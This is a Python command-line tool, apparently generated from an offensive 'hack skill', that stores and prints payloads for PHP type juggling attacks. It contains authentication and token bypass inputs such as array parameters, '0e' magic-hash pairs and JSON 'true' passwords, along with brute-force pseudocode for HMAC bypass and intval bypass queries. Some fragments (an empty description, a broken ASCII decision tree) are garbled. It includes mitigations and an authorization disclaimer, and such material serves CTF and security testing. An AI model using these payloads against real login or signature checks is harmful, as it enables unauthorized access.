#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/type-juggling

Skill: SKILL: PHP Type Juggling — Weak Comparison & Magic Hash Bypass
Desc : >-

Run:  python hack-skills-type-juggling.py --help
      python hack-skills-type-juggling.py --list
      python hack-skills-type-juggling.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/type-juggling'
TITLE = 'SKILL: PHP Type Juggling — Weak Comparison & Magic Hash Bypass'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: type-juggling", "description: >-", "PHP type juggling and weak comparison (`==`) bypass. Use when authentication, HMAC/signature checks, or token validation uses loose equality, numeric coercion, or hash comparisons without strict types \u2014 common in legacy PHP and CTF-style code paths."],
    'skill-php-type-juggling-weak-comparison-magic-hash-bypass': [],
    '0-quick-start': ["**First-pass goal**: prove the server branch treats unequal secrets/tokens as equal via coercion, not guess the real password."],
    'first-pass-payloads-auth-token-shape': ["```text", "password[]=x", "password=", "0e12345", "240610708", "QNKCDZO", "{\"password\":true}", "admin%00"],
    'minimal-php-probes-local-or-php-r-in-lab': ["```php", "<?php", "// Loose compare probes \u2014 run in target PHP major version if possible", "var_dump('0e123' == '0e999');", "var_dump('123a' == 123);", "var_dump(md5('240610708') == md5('QNKCDZO'));"],
    'routing-hints': [],
    '1-loose-comparison-truth-table-versions': ["PHP compares operands with type juggling unless you use `===` or `hash_equals()` for secrets."],
    '1-1-core-examples-strings-vs-numbers': [],
    '1-2-php-5-vs-7-vs-8-high-signal-deltas': ["**Tester takeaway**: always note **PHP version** from headers, `X-Powered-By`, or fingerprint; a payload that works on PHP 7 may fail on PHP 8."],
    '1-3-safe-alternative-defense-verification': ["```php", "hash_equals((string)$expected, (string)$actual);  // timing-safe, strict string", "// or", "$expected === $actual;"],
    '2-magic-hashes-0e-digits-only': ["When both sides are **hex-looking hash strings** that match `^0e[0-9]+$`, PHP treats them as **floats in scientific notation** \u2192 value **0.0**. Then `md5(A) == md5(B)` is **true** even though digests differ as strings."],
    '2-1-reference-table-md5-sha-1-and-longer-algos': ["**Why it works**: `md5('240610708') == md5('QNKCDZO')` \u2192 both sides match `^0e[0-9]+$` \u2192 both interpreted as **0.0 == 0.0** \u2192 **true**."],
    '2-2-exploit-pattern-in-code': ["```php", "if (md5($_GET['a']) == md5($_GET['b']) && $_GET['a'] != $_GET['b']) {", "// intended: different strings, same md5 (impossible for md5)", "// actual: two different strings whose *digests* are magic hashes"],
    '2-3-payload-sketch-pair-hunting': ["```text", "?a=240610708&b=QNKCDZO", "For SHA-224/256, treat as **search problem**: brute-force inputs until digest matches `^0e\\d+$`; pair two distinct inputs. Longer hashes = harder; MD5/SHA1 examples above are the usual teaching set."],
    '3-hmac-bypass-loose-compare-vs-0-or-0': ["If logic uses **loose** inequality against a constant:", "```php", "if (hash_hmac('md5', $data, $key) != '0') { /* ok */ }", "// or == 0, == false with string \"0e...\", etc.", "Brute-force **`$data`** (e.g. timestamp, nonce, counter) until `hash_hmac` output matches **`^0e[0-9]+$`** (for MD5 output) or the code\u2019s specific loose rule \u2014 then the hash may compare equal to `0` or to another magic digest under `==`."],
    'example-md5-style-0e-digest-for-a-numeric-message': ["```text"],
    'conceptual-try-many-timestamps': ["for t in range(T0, T1):", "if re.fullmatch(r'0e\\d+', hmac_md5(str(t), key)):", "use t", "**Mitigation**: `hash_equals($mac, $expected)` + fixed-length hex/binary encoding; never compare HMAC to bare `\"0\"`."],
    '4-null-juggling-arrays-type-errors': ["Invalid types can yield **`NULL`** on the compared side; loose equality to another `NULL` or coerced value may pass.", "```php", "// CTF / broken code mental model:", "@sha1($_GET['x']) == @sha1($_GET['y']);  // if both error to NULL \u2192 true", "**Real audits**: look for **`@`**, custom `try/catch` that sets hash to `null`, or user input passed where a string is required."],
    '5-ctf-patterns': [],
    '5-1-strcmp-strcasecmp-with-arrays': ["```php", "strcmp([], \"password\");  // NULL in PHP 7/8 (invalid args)", "// NULL == 0  \u2192 true in loose compare if code does:", "if (strcmp($_GET['p'], $secret) == 0)", "Payload:", "```text", "?p[]=1"],
    '5-2-intval-bypass': ["```php", "// Hex: base 0 lets PHP interpret 0x prefix (version-dependent; always verify)", "intval(\"0x1A\", 0);   // \u2192 26", "// Octal: leading 0 can be parsed as octal with base 0", "intval(\"010\", 0);  // \u2192 8 (classic teaching example; confirm on target PHP)", "// Scientific notation: intval() alone stops at 'e'; cast via float first", "intval((float) \"1e2\"); // \u2192 100", "```text", "?id=0x1A", "?id=010", "?id=1e2"],
    '5-3-json-decode-true-for-associative-array-auth': ["```json", "{\"password\": true}", "```php", "$j = json_decode($input, true);", "if ($j['password'] == $stored_string) // true == \"nonempty\" often true \u2014 see PHP loose rules"],
    '5-4-is-numeric-loose-compare': ["```php", "is_numeric(\"0e12345\");  // true", "\"0e12345\" == 0;         // true (scientific notation \u2192 0.0)"],
    '5-5-deserialization-magic-properties': ["Unserialize user input into objects whose `__toString` or properties feed into `md5($obj)` or loose compare \u2014 combine with **magic hash** strings on properties (CTF). Look for `unserialize($_\u2026)` near `==` on hashes."],
    '6-decision-tree': ["```text", "+------------------+", "+--------+---------+", "+-------------+-------------+", "+------v------+             +------v------+", "+------+------+             +------+-------+", "STOP (likely)              +-----v-----+", "+-----+-----+", "+--------------+---+--------------+", "+------v------+ +-----v-----+    +-------v--------+", "+------+------+ +-----+-----+    +-------+--------+", "MAGIC HASH    STRING/INT           MAGIC HASH", "COLLISION     JUGGLING             (md5/sha1/\u2026)", "+------+-------+------------------+", "+------v------+", "+------+------+", "brute $data", "for 0e\u2026 digest", "+------v------+", "+-------------+"],
    'tool-references': ["**Safety & scope**: Use only on **authorized** targets (CTF, lab, written permission). This skill explains **language semantics** for defense and assessment \u2014 not a license to attack systems without consent."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()